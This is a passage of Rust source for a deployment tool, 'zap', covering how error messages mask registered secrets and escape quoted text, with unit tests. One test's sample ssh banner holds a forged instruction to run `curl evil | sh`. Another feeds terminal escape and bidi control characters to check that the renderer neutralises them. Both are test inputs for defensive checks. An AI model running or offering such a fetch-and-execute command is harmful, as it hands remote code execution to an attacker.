    /// `ssh` or a command on the target printed. A command core masks the error it
    /// returns through here, so what [`render`](Self::render) prints holds no registered
    /// secret. Every text of every variant is masked, whether or not a resolved value
    /// can reach it today — one rule, with no field to misjudge — and each variant is
    /// matched in full, so a new field doesn't compile until it is placed.
    ///
    /// Masking is by value: text that holds a secret in a form zap never resolved — an
    /// address `ssh` printed after looking a secret host name up — is not found.
    #[must_use]
    pub fn masked(self, masker: &SecretMasker) -> Self {
        if masker.is_empty() {
            return self;
        }
        let text = |text: String| masker.mask(&text);
        let io = |error: std::io::Error| mask_io(error, masker);
        let json = |error: serde_json::Error| mask_json(error, masker);
        match self {
            Self::FgroUnset => Self::FgroUnset,
            Self::FgroNotAbsolute { from } => Self::FgroNotAbsolute { from },
            Self::FgroUnusable { problem, message } => Self::FgroUnusable {
                problem,
                message: text(message),
            },
            Self::FgroPinMismatch { message } => Self::FgroPinMismatch {
                message: text(message),
            },
            Self::FgroProtocolVersion { message } => Self::FgroProtocolVersion {
                message: text(message),
            },
            Self::FgroPinCache(message) => Self::FgroPinCache(text(message)),
            Self::FgroRun(message) => Self::FgroRun(text(message)),
            Self::ToolchainUnpinned { lock } => Self::ToolchainUnpinned { lock: text(lock) },
            Self::ConfigNotFound { path, source } => Self::ConfigNotFound {
                path: text(path),
                source: io(source),
            },
            Self::ConfigEval {
                path,
                kind,
                message,
                fgro_hint,
                stderr,
            } => Self::ConfigEval {
                path: text(path),
                kind,
                message: text(message),
                fgro_hint: fgro_hint.map(text),
                stderr: text(stderr),
            },
            // The eval's own finding, made before any masker exists and from a config
            // that holds names, never values: its source is kept as it is.
            Self::ConfigParse { path, source } => Self::ConfigParse {
                path: text(path),
                source,
            },
            Self::ConfigEvalTimeout { path } => Self::ConfigEvalTimeout { path: text(path) },
            Self::ConfigEvalOutputTooLarge { path, limit } => Self::ConfigEvalOutputTooLarge {
                path: text(path),
                limit,
            },
            Self::ConfigTrustRoot { problem, message } => Self::ConfigTrustRoot {
                problem,
                message: text(message),
            },
            Self::ConfigRunAs { problem, message } => Self::ConfigRunAs {
                problem,
                message: text(message),
            },
            Self::ConfigIo(source) => Self::ConfigIo(io(source)),
            Self::EnvFile { path, message } => Self::EnvFile {
                path: text(path),
                message: text(message),
            },
            Self::Config(message) => Self::Config(text(message)),
            Self::ExpectPlanWithoutWetrun => Self::ExpectPlanWithoutWetrun,
            Self::WetrunRefused(message) => Self::WetrunRefused(text(message)),
            Self::ConfigNamedLikeLock { path } => Self::ConfigNamedLikeLock { path: text(path) },
            Self::Command(source) => Self::Command(io(source)),
            Self::Git(message) => Self::Git(text(message)),
            Self::ZapHomeUnset => Self::ZapHomeUnset,
            Self::HomeNotAbsolute { var } => Self::HomeNotAbsolute { var },
            Self::StateDir { path, found } => Self::StateDir {
                path: text(path),
                found: text(found),
            },
            Self::PreviewWithdraw { of, path, message } => Self::PreviewWithdraw {
                of,
                path: text(path),
                message: text(message),
            },
            Self::PreviewSpent { of } => Self::PreviewSpent { of },
            Self::DirtyTree => Self::DirtyTree,
            Self::LiveReleaseUnknown(message) => Self::LiveReleaseUnknown(text(message)),
            Self::MockCommand(command) => Self::MockCommand(text(command)),
            Self::Connectivity {
                target,
                message,
                changed_host_key,
            } => Self::Connectivity {
                target: text(target),
                message: text(message),
                changed_host_key: changed_host_key.map(text),
            },
            Self::RemoteHomeUnset { path } => Self::RemoteHomeUnset { path: text(path) },
            Self::LocalHomeUnset { path } => Self::LocalHomeUnset { path: text(path) },
            // A variable's name and zap's own words: no value.
            Self::UnusableValue(source) => Self::UnusableValue(source),
            Self::ReadFile { path, cause } => Self::ReadFile {
                path: text(path),
                cause: mask_cause(cause, masker),
            },
            Self::FileOp { op, path, cause } => Self::FileOp {
                op,
                path: text(path),
                cause: mask_cause(cause, masker),
            },
            Self::ConfigHash(source) => Self::ConfigHash(json(source)),
            Self::PlanHash(source) => Self::PlanHash(json(source)),
            Self::Secret(message) => Self::Secret(text(message)),
            Self::ContentHashMismatch {
                url,
                declared,
                fetched,
            } => Self::ContentHashMismatch {
                url: text(url),
                declared: text(declared),
                fetched: text(fetched),
            },
            Self::SignatureVerification { url, message } => Self::SignatureVerification {
                url: text(url),
                message: text(message),
            },
            Self::Fetch { url, message } => Self::Fetch {
                url: text(url),
                message: text(message),
            },
            Self::FetchVarUnset { url, vars } => Self::FetchVarUnset {
                url: text(url),
                vars: text(vars),
            },
            Self::AuthUnset { url } => Self::AuthUnset { url: text(url) },
            Self::CacheWrite { path, source } => Self::CacheWrite {
                path: text(path),
                source: io(source),
            },
            Self::EntryNotResolvable { id, expected } => Self::EntryNotResolvable {
                id: text(id),
                expected,
            },
            Self::LockIo { path, source } => Self::LockIo {
                path: text(path),
                source: io(source),
            },
            Self::LockParse { path, source } => Self::LockParse {
                path: text(path),
                source: json(source),
            },
            Self::LockVersion {
                path,
                found,
                supported,
            } => Self::LockVersion {
                path: text(path),
                found,
                supported,
            },
            Self::LockStale { id } => Self::LockStale { id: text(id) },
            Self::LockUnverifiable { id, vars } => Self::LockUnverifiable {
                id: text(id),
                vars: text(vars),
            },
        }
    }
}

/// `cause` with its text masked: an io error's as [`mask_io`] masks it.
fn mask_cause(cause: FailureCause, masker: &SecretMasker) -> FailureCause {
    match cause {
        FailureCause::Io(error) => FailureCause::Io(mask_io(error, masker)),
        FailureCause::TimedOut(text) => FailureCause::TimedOut(masker.mask(&text)),
        FailureCause::Exited { stderr, code } => FailureCause::Exited {
            stderr: masker.mask(&stderr),
            code,
        },
        FailureCause::Text(text) => FailureCause::Text(masker.mask(&text)),
    }
}

/// `error` with its message masked: itself when the message holds no secret, else an
/// error of the same kind whose message is the masked one.
fn mask_io(error: std::io::Error, masker: &SecretMasker) -> std::io::Error {
    let message = error.to_string();
    let masked = masker.mask(&message);
    if masked == message {
        error
    } else {
        std::io::Error::new(error.kind(), masked)
    }
}

/// `error` with its message masked: itself when the message holds no secret, else an
/// error whose whole message — the position included — is the masked one.
fn mask_json(error: serde_json::Error, masker: &SecretMasker) -> serde_json::Error {
    let message = error.to_string();
    let masked = masker.mask(&message);
    if masked == message {
        error
    } else {
        <serde_json::Error as serde::de::Error>::custom(masked)
    }
}

/// Result alias for the engine.
pub type Result<T> = std::result::Result<T, Error>;

#[cfg(test)]
mod tests {
    use super::{Error, FailureCause, Previewed};

    /// An ordinary one-line error prints as `error: <message>`.
    #[test]
    fn a_one_line_error_renders_on_one_line() {
        assert_eq!(
            Error::Config("remote target declares no `host`".to_owned()).render(),
            "error: invalid config: remote target declares no `host`\n"
        );
        assert_eq!(
            Error::LockStale {
                id: "tool".to_owned()
            }
            .render(),
            "error: lock entry for `tool` is stale (config changed since it was pinned) — run \
             `zap update tool`\n"
        );
    }

    /// What isn't the config's is not rendered as an invalid config: a flag that binds
    /// nothing on a dry run, a wetrun zap declines, and a config named like its lock.
    /// Each is the operator's to change before a re-run, so each exits 2.
    #[test]
    fn a_usage_error_a_refusal_and_a_lock_name_clash_are_not_config_errors() {
        for (error, rendered) in [
            (
                Error::ExpectPlanWithoutWetrun,
                "error: --expect-plan binds a wetrun to a reviewed plan; a dry run only \
                 previews (add --wetrun)\n",
            ),
            (
                Error::WetrunRefused("a wetrun needs a plan — nothing ran: why".to_owned()),
                "error: a wetrun needs a plan — nothing ran: why\n",
            ),
            (
                Error::ConfigNamedLikeLock {
                    path: "prod.lock".to_owned(),
                },
                "error: the config `prod.lock` has the name its own lock file would have (the \
                 config's name with the extension `.lock`), so the lock would be written over \
                 it — give the config another extension\n",
            ),
        ] {
            assert_eq!(error.exit_code(), 2, "{error:?}");
            assert_eq!(error.render(), rendered);
            assert!(error.hint().is_none(), "{error:?}");
        }
    }

    /// A native io error's code is the OS's word, not the message's: its OS code where the
    /// kind can't say (`ELOOP`), else its kind — a custom error of zap's own words
    /// included. A kind that says nothing to triage by is read by its words.
    #[test]
    fn an_io_error_classifies_by_its_kind_not_its_words() {
        use std::io::{Error as Io, ErrorKind as K};

        use nix::libc;
        use zap_types::error_code::ErrorCode as C;

        use super::io_error_code;

        for (errno, code) in [
            (libc::EACCES, C::Permission),
            (libc::EPERM, C::Permission),
            (libc::ENOENT, C::NotFound),
            (libc::ELOOP, C::Conflict),
            (libc::ENOSPC, C::Conflict),
            (libc::EDQUOT, C::Conflict),
            (libc::EEXIST, C::Conflict),
            (libc::ENOTDIR, C::Conflict),
            (libc::EISDIR, C::Conflict),
            (libc::ENOTEMPTY, C::Conflict),
            (libc::EBUSY, C::Conflict),
            (libc::ETXTBSY, C::Conflict),
            (libc::EADDRINUSE, C::Conflict),
            (libc::ETIMEDOUT, C::Transient),
            (libc::ECONNREFUSED, C::Transient),
            (libc::ECONNRESET, C::Transient),
            (libc::ECONNABORTED, C::Transient),
            (libc::ENOTCONN, C::Transient),
            (libc::ENETUNREACH, C::Transient),
            (libc::EHOSTUNREACH, C::Transient),
            (libc::ENETDOWN, C::Transient),
            // a kind with nothing to triage by, whose words say nothing either
            (libc::EROFS, C::ExecutionFailed),
            (libc::E2BIG, C::ExecutionFailed),
        ] {
            let error = Io::from_raw_os_error(errno);
            assert_eq!(io_error_code(&error), code, "{error}");
        }
        // zap's own words under a kind: the kind decides
        for (kind, code) in [
            (K::PermissionDenied, C::Permission),
            (K::NotFound, C::NotFound),
            (K::NotADirectory, C::Conflict),
            (K::IsADirectory, C::Conflict),
            (K::TimedOut, C::Transient),
        ] {
            assert_eq!(
                io_error_code(&Io::new(kind, "in zap's words")),
                code,
                "{kind:?}"
            );
        }
        // a kind that says nothing: the words decide
        assert_eq!(
            io_error_code(&Io::other("Permission denied")),
            C::Permission
        );
        assert_eq!(
            io_error_code(&Io::new(K::InvalidInput, "the path holds a delimiter")),
            C::ExecutionFailed
        );
    }

    /// A failed file operation or read classifies by its cause alone: a native call's io
    /// error by its kind, text by its words — never by the path or the operation the
    /// message also names. An error with an io source classifies by it; any other by its
    /// message, as what `ssh` said or a command printed is only words.
    #[test]
    fn a_change_failure_classifies_by_its_cause() {
        use zap_types::error_code::ErrorCode as C;

        let op = |cause: FailureCause| Error::FileOp {
            op: "write",
            path: "/srv/no such file or directory/lock file".to_owned(),
            cause,
        };
        let not_a_dir = || {
            std::io::Error::new(
                std::io::ErrorKind::NotADirectory,
                "srv is not a directory of its own (a symbolic link is not followed)",
            )
        };
        assert_eq!(op(FailureCause::Io(not_a_dir())).error_code(), C::Conflict);
        assert_eq!(
            op(FailureCause::Io(not_a_dir())).to_string(),
            "failed to write /srv/no such file or directory/lock file: srv is not a directory \
             of its own (a symbolic link is not followed)"
        );
        assert_eq!(
            op(FailureCause::Text("tee: Permission denied".to_owned())).error_code(),
            C::Permission
        );
        assert_eq!(
            op(FailureCause::Text("refused".to_owned())).error_code(),
            C::ExecutionFailed
        );
        let read = Error::ReadFile {
            path: "/etc/x".to_owned(),
            cause: std::io::Error::from_raw_os_error(nix::libc::ENOENT).into(),
        };
        assert_eq!(read.error_code(), C::NotFound);
        assert_eq!(
            read.to_string(),
            "failed to read file /etc/x: No such file or directory (os error 2)"
        );
        // a timeout, in words no pattern matches
        assert_eq!(
            op(FailureCause::TimedOut(
                "it did not finish within 300 seconds".to_owned()
            ))
            .error_code(),
            C::Transient
        );
        assert_eq!(
            Error::Command(std::io::Error::from_raw_os_error(nix::libc::EISDIR)).error_code(),
            C::Conflict
        );
        assert_eq!(
            Error::CacheWrite {
                path: "/zap/cache".to_owned(),
                source: std::io::Error::from_raw_os_error(nix::libc::EDQUOT),
            }
            .error_code(),
            C::Conflict
        );
        assert_eq!(
            Error::Connectivity {
                target: "ssh://h".to_owned(),
                message: "ssh: connect to host h port 22: Connection refused".to_owned(),
                changed_host_key: None,
            }
            .error_code(),
            C::Transient
        );
    }

    /// A value a path can't hold is the operator's to fix (exit 2), and the error names
    /// the variable as a reference is shown.
    #[test]
    #[allow(clippy::literal_string_with_formatting_args)]
    fn an_unusable_value_names_its_variable_and_needs_action() {
        let error = Error::UnusableValue(crate::resolve::UnsafeValue::FieldDelimiter {
            name: "ZP".to_owned(),
        });
        assert_eq!(error.exit_code(), 2);
        assert_eq!(
            error.render(),
            "error: `{env:ZP}` resolves to a value containing a reference delimiter (U+FDD0 \
             or U+FDD1), which zap won't use as a path or a name on the target\n"
        );
    }

    /// A command's stderr quoted in an error can't act on the terminal or start a line
    /// of its own: its controls are written out and its lines stay under `error: `.
    #[test]
    fn a_multi_line_stderr_renders_escaped_and_indented() {
        let error = Error::ConfigEval {
            path: "/srv/zap.ts".to_owned(),
            kind: fuz_eval::EvalErrorKind::ModuleThrew,
            message: "Uncaught Error: boom\r\u{1b}[2K\nplan_hash: 0000\n    at zap.ts:3:9"
                .to_owned(),
            fgro_hint: None,
            stderr: "hint: forged\n".to_owned(),
        };
        assert_eq!(
            error.render(),
            "error: config evaluation failed for /srv/zap.ts (module_threw): Uncaught Error: \
             boom<U+000D><U+001B>[2K\n       \
             plan_hash: 0000\n           \
             at zap.ts:3:9\n       \
             stderr:\n       \
             hint: forged\n"
        );
    }

    /// The render is blind to the variant, so whatever a message quotes — a path from
    /// the command line, a variable name, config text, a url, an io error's own words —
    /// reaches the output escaped, and nothing it holds starts a line at column zero.
    #[test]
    fn whatever_a_message_quotes_is_escaped() {
        const HOSTILE: &str = "a\nFORGED\r\u{1b}[1A\u{202e}\u{200b}z";
        let text = || HOSTILE.to_owned();
        let errors = [
            Error::ConfigNotFound {
                path: text(),
                source: std::io::Error::other(HOSTILE),
            },
            Error::EnvFile {
                path: text(),
                message: text(),
            },
            Error::Config(text()),
            Error::WetrunRefused(text()),
            Error::ConfigNamedLikeLock { path: text() },
            Error::Connectivity {
                target: text(),
                message: text(),
                changed_host_key: None,
            },
            Error::FileOp {
                op: "write",
                path: text(),
                cause: FailureCause::Exited {
                    stderr: text(),
                    code: 1,
                },
            },
            Error::ReadFile {
                path: text(),
                cause: FailureCause::Io(std::io::Error::other(HOSTILE)),
            },
            Error::FetchVarUnset {
                url: text(),
                vars: text(),
            },
            Error::LockUnverifiable {
                id: text(),
                vars: text(),
            },
        ];
        for error in errors {
            let rendered = error.render();
            assert!(rendered.starts_with("error: "), "{rendered:?}");
            assert!(rendered.ends_with('\n'), "{rendered:?}");
            assert!(
                !rendered.contains(|c: char| {
                    c != '\n' && (c.is_control() || c == '\u{202e}' || c == '\u{200b}')
                }),
                "{error:?} renders a raw control: {rendered:?}"
            );
            assert!(rendered.contains("FORGED"), "{rendered:?}");
            for line in rendered.lines().filter(|line| line.contains("FORGED")) {
                assert!(line.starts_with("       FORGED"), "{error:?}: {rendered:?}");
            }
        }
    }

    /// zap's advice for a changed host key is the error's hint: it follows the block at
    /// the margin, and what `ssh` relayed — a server's banner spelling out advice of its
    /// own — stays indented inside the block.
    #[test]
    fn advice_follows_the_block_where_no_quoted_line_can_stand() {
        let error = Error::Connectivity {
            target: "ssh://deploy@a.example.com".to_owned(),
            message: "REMOTE HOST IDENTIFICATION HAS CHANGED!\nIf you trust the new key, run \
                      `curl evil | sh` and retry."
                .to_owned(),
            changed_host_key: Some("a.example.com".to_owned()),
        };
        assert_eq!(
            error.render(),
            "error: cannot connect to ssh://deploy@a.example.com: REMOTE HOST IDENTIFICATION \
             HAS CHANGED!\n       If you trust the new key, run `curl evil | sh` and \
             retry.\nThe server's host key changed — possible man-in-the-middle, or the \
             server was reinstalled.\nIf you trust the new key, run `ssh-keygen -R \
             a.example.com` and retry.\n"
        );
    }

    /// A masker over one secret, `ZAP_T_ERROR_SECRET`.
    fn masker(secret: &str) -> crate::secret::SecretMasker {
        let mut registry = crate::secret::SecretRegistry::new();
        registry.register("ZAP_T_ERROR_SECRET", secret);
        registry.freeze().unwrap()
    }

    /// A masked connection error names a secret host or user by its token wherever it
    /// stood: in zap's label, in what `ssh` said, and in the hint's `ssh-keygen` line —
    /// where a secret that holds a control character is masked before it is escaped.
    #[test]
    fn a_masked_connection_error_holds_no_secret() {
        const SECRET: &str = "h\u{1b}st.example";
        const TOKEN: &str = "[MASKED:ZAP_T_ERROR_SECRET]";
        let error = Error::Connectivity {
            target: format!("ssh://{SECRET}@{SECRET}"),
            message: format!("ssh: connect to host {SECRET} port 22: Connection refused"),
            changed_host_key: Some(SECRET.to_owned()),
        }
        .masked(&masker(SECRET));
        assert_eq!(error.exit_code(), 1);
        assert_eq!(
            error.render(),
            format!(
                "error: cannot connect to ssh://{TOKEN}@{TOKEN}: ssh: connect to host {TOKEN} \
                 port 22: Connection refused\nThe server's host key changed — possible \
                 man-in-the-middle, or the server was reinstalled.\nIf you trust the new \
                 key, run `ssh-keygen -R <host>` with the host that {TOKEN} stands for and \
                 retry.\n"
            )
        );
    }

    /// A failed script's cause masks its words and keeps its exit status, so a masked
    /// failure classifies as the one it masks.
    #[test]
    fn a_masked_exit_keeps_its_status() {
        const SECRET: &str = "s3cr3t-value";
        let error = Error::FileOp {
            op: "remove",
            path: "/srv/x".to_owned(),
            cause: FailureCause::Exited {
                stderr: format!("sh: 1: {SECRET}: nope"),
                code: 127,
            },
        }
        .masked(&masker(SECRET));
        assert_eq!(
            error.to_string(),
            "failed to remove /srv/x: sh: 1: [MASKED:ZAP_T_ERROR_SECRET]: nope"
        );
        assert_eq!(
            error.error_code(),
            zap_types::error_code::ErrorCode::NotFound
        );
    }

    /// One sample per `Error` variant, each beside the pattern it is a sample of. The
    /// patterns are also the arms of a `match` with no wildcard, so a variant with no
    /// entry here doesn't compile; `entry` names the arm an error falls in.
    macro_rules! error_samples {
        ($($pattern:pat => $sample:expr),+ $(,)?) => {{
            fn entry(error: &Error) -> &'static str {
                match error {
                    $($pattern => stringify!($pattern)),+
                }
            }
            let samples: Vec<(&'static str, Error)> =
                vec![$((stringify!($pattern), $sample)),+];
            let entry: fn(&Error) -> &'static str = entry;
            (entry, samples)
        }};
    }

    /// Every text an error carries is masked, whatever the variant — a wrapped io or
    /// JSON error's message included — and masking moves no exit code. With nothing
    /// registered, and for a message that holds no secret, the error is unchanged.
    #[test]
    fn every_text_of_every_error_is_masked() {
        const SECRET: &str = "hunter2-value";
        // The variants with no text of their own to mask: zap's own words, and a
        // variable's name.
        const TEXTLESS: [&str; 8] = [
            "Error::FgroUnset",
            "Error::FgroNotAbsolute { .. }",
            "Error::ExpectPlanWithoutWetrun",
            "Error::ZapHomeUnset",
            "Error::HomeNotAbsolute { .. }",
            "Error::PreviewSpent { .. }",
            "Error::DirtyTree",
            "Error::UnusableValue(_)",
        ];
        let text = || format!("a {SECRET} b");
        let io = || std::io::Error::other(text());
        let json = || <serde_json::Error as serde::de::Error>::custom(text());
        let errors = || {
            error_samples! {
                Error::FgroUnset => Error::FgroUnset,
                Error::FgroNotAbsolute { .. } => Error::FgroNotAbsolute { from: "ZAP_FGRO" },
                Error::FgroUnusable { .. } => Error::FgroUnusable {
                    problem: fuz_eval::FgroProblem::NotFound,
                    message: text(),
                },
                Error::FgroPinMismatch { .. } => Error::FgroPinMismatch { message: text() },
                Error::FgroProtocolVersion { .. } => Error::FgroProtocolVersion {
                    message: text(),
                },
                Error::FgroPinCache(_) => Error::FgroPinCache(text()),
                Error::FgroRun(_) => Error::FgroRun(text()),
                Error::ToolchainUnpinned { .. } => Error::ToolchainUnpinned { lock: text() },
                Error::ConfigNotFound { .. } => Error::ConfigNotFound {
                    path: text(),
                    source: io(),
                },
                Error::ConfigEval { .. } => Error::ConfigEval {
                    path: text(),
                    kind: fuz_eval::EvalErrorKind::ModuleThrew,
                    message: text(),
                    fgro_hint: Some(text()),
                    stderr: text(),
                },
                // Its source is the eval's own finding, which holds names and never a
                // value: the path is the text.
                Error::ConfigParse { .. } => Error::ConfigParse {
                    path: text(),
                    source: zap_types::schema::WireError::Delimiter("resources[0].path".to_owned()),
                },
                Error::ConfigEvalTimeout { .. } => Error::ConfigEvalTimeout { path: text() },
                Error::ConfigEvalOutputTooLarge { .. } => Error::ConfigEvalOutputTooLarge {
                    path: text(),
                    limit: 1,
                },
                Error::ConfigTrustRoot { .. } => Error::ConfigTrustRoot {
                    problem: fuz_eval::TrustRootProblem::InvalidPackageJson,
                    message: text(),
                },
                Error::ConfigRunAs { .. } => Error::ConfigRunAs {
                    problem: fuz_eval::RunAsProblem::NoPasswdEntry { uid: 1 },
                    message: text(),
                },
                Error::ConfigIo(_) => Error::ConfigIo(io()),
                Error::EnvFile { .. } => Error::EnvFile {
                    path: text(),
                    message: text(),
                },
                Error::Config(_) => Error::Config(text()),
                Error::ExpectPlanWithoutWetrun => Error::ExpectPlanWithoutWetrun,
                Error::WetrunRefused(_) => Error::WetrunRefused(text()),
                Error::ConfigNamedLikeLock { .. } => Error::ConfigNamedLikeLock { path: text() },
                Error::Command(_) => Error::Command(io()),
                Error::Git(_) => Error::Git(text()),
                Error::ZapHomeUnset => Error::ZapHomeUnset,
                Error::HomeNotAbsolute { .. } => Error::HomeNotAbsolute { var: "ZAP_HOME" },
                Error::StateDir { .. } => Error::StateDir {
                    path: text(),
                    found: text(),
                },
                Error::PreviewWithdraw { .. } => Error::PreviewWithdraw {
                    of: Previewed::Deploy,
                    path: text(),
                    message: text(),
                },
                Error::PreviewSpent { .. } => Error::PreviewSpent {
                    of: Previewed::Apply,
                },
                Error::DirtyTree => Error::DirtyTree,
                Error::LiveReleaseUnknown(_) => Error::LiveReleaseUnknown(text()),
                Error::MockCommand(_) => Error::MockCommand(text()),
                // The host of a changed key is the hint's, which words a masked one
                // its own way (`a_masked_connection_error_holds_no_secret`).
                Error::Connectivity { .. } => Error::Connectivity {
                    target: text(),
                    message: text(),
                    changed_host_key: None,
                },
                Error::RemoteHomeUnset { .. } => Error::RemoteHomeUnset { path: text() },
                Error::LocalHomeUnset { .. } => Error::LocalHomeUnset { path: text() },
                Error::UnusableValue(_) => Error::UnusableValue(crate::resolve::UnsafeValue::Nul {
                    name: "ZAP_T_ERROR_NAME".to_owned(),
                }),
                Error::ReadFile { .. } => Error::ReadFile {
                    path: text(),
                    cause: FailureCause::Io(io()),
                },
                Error::FileOp { .. } => Error::FileOp {
                    op: "write",
                    path: text(),
                    cause: FailureCause::Exited {
                    stderr: text(),
                    code: 1,
                },
                },
                Error::ConfigHash(_) => Error::ConfigHash(json()),
                Error::PlanHash(_) => Error::PlanHash(json()),
                Error::Secret(_) => Error::Secret(text()),
                Error::ContentHashMismatch { .. } => Error::ContentHashMismatch {
                    url: text(),
                    declared: text(),
                    fetched: text(),
                },
                Error::SignatureVerification { .. } => Error::SignatureVerification {
                    url: text(),
                    message: text(),
                },
                Error::Fetch { .. } => Error::Fetch {
                    url: text(),
                    message: text(),
                },
                Error::FetchVarUnset { .. } => Error::FetchVarUnset {
                    url: text(),
                    vars: text(),
                },
                Error::AuthUnset { .. } => Error::AuthUnset { url: text() },
                Error::CacheWrite { .. } => Error::CacheWrite {
                    path: text(),
                    source: io(),
                },
                Error::EntryNotResolvable { .. } => Error::EntryNotResolvable {
                    id: text(),
                    expected: "lock-eligible",
                },
                Error::LockIo { .. } => Error::LockIo {
                    path: text(),
                    source: io(),
                },
                Error::LockParse { .. } => Error::LockParse {
                    path: text(),
                    source: json(),
                },
                Error::LockVersion { .. } => Error::LockVersion {
                    path: text(),
                    found: 9,
                    supported: 1,
                },
                Error::LockStale { .. } => Error::LockStale { id: text() },
                Error::LockUnverifiable { .. } => Error::LockUnverifiable {
                    id: text(),
                    vars: text(),
                },
            }
        };
        let masker = masker(SECRET);
        let (entry, samples) = errors();
        let mut textless = Vec::new();
        for (label, error) in samples {
            assert_eq!(entry(&error), label, "a sample of another variant");
            let (code, before) = (error.exit_code(), error.render());
            if !before.contains(SECRET) {
                textless.push(label);
            }
            let masked = error.masked(&masker);
            assert_eq!(entry(&masked), label, "masking changed the variant");
            assert_eq!(masked.exit_code(), code, "{masked:?}");
            let after = masked.render();
            assert_eq!(
                after,
                before.replace(SECRET, "[MASKED:ZAP_T_ERROR_SECRET]"),
                "{masked:?}"
            );
            assert!(!format!("{masked:?}").contains(SECRET), "{masked:?}");
        }
        assert_eq!(textless, TEXTLESS, "every other variant carries text");

        let none = crate::secret::SecretRegistry::new().freeze().unwrap();
        for ((_, error), (_, other)) in errors().1.into_iter().zip(errors().1) {
            assert_eq!(error.masked(&none).render(), other.render());
        }
        // An io error whose message holds no secret is the error it was: its OS code
        // is kept.
        let Error::Command(source) =
            Error::Command(std::io::Error::from_raw_os_error(2)).masked(&masker)
        else {
            unreachable!()
        };
        assert_eq!(source.raw_os_error(), Some(2));
    }

    /// What only the operator's environment can put right is needs-action, like a
    /// config that needs fixing: a re-run as it is fails the same way.
    #[test]
    fn a_home_the_operator_must_fix_is_needs_action() {
        for error in [
            Error::ZapHomeUnset,
            Error::HomeNotAbsolute { var: "ZAP_HOME" },
            Error::StateDir {
                path: "/zap-home/cache".to_owned(),
                found: "is a symbolic link".to_owned(),
            },
            Error::LocalHomeUnset {
                path: "~/bin".to_owned(),
            },
            Error::RemoteHomeUnset {
                path: "~/bin".to_owned(),
            },
        ] {
            assert_eq!(error.exit_code(), 2, "{error}");
        }
    }

    /// The hint follows the message on lines of its own, and trailing newlines of a
    /// message leave no empty line behind.
    #[test]
    fn the_hint_follows_the_message() {
        let rendered = Error::FgroUnset.render();
        assert!(
            rendered.starts_with(
                "error: no fgro binary to evaluate the config with\nzap evaluates every config"
            ),
            "{rendered}"
        );
        assert!(rendered.ends_with("~/.zap/bin/fgro.\n"), "{rendered}");
        assert_eq!(
            Error::Secret("stopped\n\n".to_owned()).render(),
            "error: stopped\n"
        );
    }

    /// Every refusal of the fgro binary or its pin is needs-action with a hint naming
    /// the fix, except a binary written while zap read it, which a retry clears.
    #[test]
    fn an_fgro_refusal_names_its_fix() {
        use fuz_eval::FgroProblem as F;
        for (error, code, advice) in [
            (Error::FgroUnset, 2, "under sudo only `--fgro` reaches zap"),
            (
                Error::FgroNotAbsolute { from: "ZAP_FGRO" },
                2,
                "under sudo only `--fgro` reaches zap",
            ),
            (
                Error::FgroUnusable {
                    problem: F::NotFound,
                    message: "the fgro binary /x does not exist".to_owned(),
                },
                2,
                "Name the fgro build with `--fgro <path>`",
            ),
            (
                Error::FgroPinMismatch {
                    message: "x".to_owned(),
                },
                2,
                "run `zap lock` to pin it",
            ),
            (
                Error::FgroProtocolVersion {
                    message: "x".to_owned(),
                },
                2,
                "run `zap lock` to pin the fgro build",
            ),
            (
                Error::ToolchainUnpinned {
                    lock: "/p/zap.lock".to_owned(),
                },
                2,
                "Run `zap lock`",
            ),
            // the command that pins one also says what else stops an eval, so the one it
            // names first is never a step short of the answer
            (
                Error::ToolchainUnpinned {
                    lock: "/p/zap.lock".to_owned(),
                },
                2,
                "`zap lock` also checks that the config has a project",
            ),
        ] {
            assert_eq!(error.exit_code(), code, "{error:?}");
            let rendered = error.render();
            assert!(rendered.contains(advice), "{error:?}: {rendered}");
        }
        // a missing binary's message says so already; its hint only says where to
        // name another, once
        let missing = Error::FgroUnusable {
            problem: F::NotFound,
            message: "x".to_owned(),
        };
        assert_eq!(missing.hint().as_deref(), Some(super::FGRO_SETTING_HINT));
        let changed = Error::FgroUnusable {
            problem: F::ChangedSincePin,
            message: "x".to_owned(),
        };
        assert_eq!(changed.exit_code(), 1);
        assert_eq!(changed.hint(), None);
    }

    /// A trust root that can't be settled exits 2, needs-action, with advice for
    /// what is wrong after the message.
    #[test]
    fn a_trust_root_refusal_exits_2_with_a_hint_for_its_problem() {
        use fuz_eval::TrustRootProblem as P;
        for (problem, advice) in [
            (P::WorldWritableConfigDir, "`chmod o-w` on that directory"),
            (
                P::WorldWritableConfigFile,
                "`chmod o-w` on the config file the message names",
            ),
            (P::InvalidPackageJson, "are strings"),
            (
                P::WalkStopped(fuz_eval::WalkStop::WorldWritable),
                "`chmod o-w` it if it's yours",
            ),
            (
                P::WalkStopped(fuz_eval::WalkStop::OtherOwner),
                "a package.json beside it",
            ),
            (P::NoProject, "a package.json beside it"),
        ] {
            let error = Error::ConfigTrustRoot {
                problem,
                message: "refused to evaluate /p/zap.ts: x".to_owned(),
            };
            assert_eq!(error.exit_code(), 2);
            let rendered = error.render();
            assert!(
                rendered.starts_with("error: refused to evaluate /p/zap.ts: x\n"),
                "{rendered}"
            );
            assert!(rendered.contains(advice), "{problem:?}: {rendered}");
        }
    }
}
